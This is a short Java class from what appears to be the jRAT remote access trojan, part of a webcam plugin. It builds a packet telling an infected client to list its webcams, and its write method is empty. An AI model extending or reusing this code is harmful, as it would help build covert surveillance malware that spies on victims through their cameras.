package se.jrat.plugin.webcam.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.PacketBuilder;
import jrat.api.Client;

public class Packet121ListWebcams extends PacketBuilder {

	public Packet121ListWebcams(Client rat) {
		super(WebcamPlugin.LIST_WEBCAM_HEADER, rat);
	}

	@Override
	public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
		
	}

}
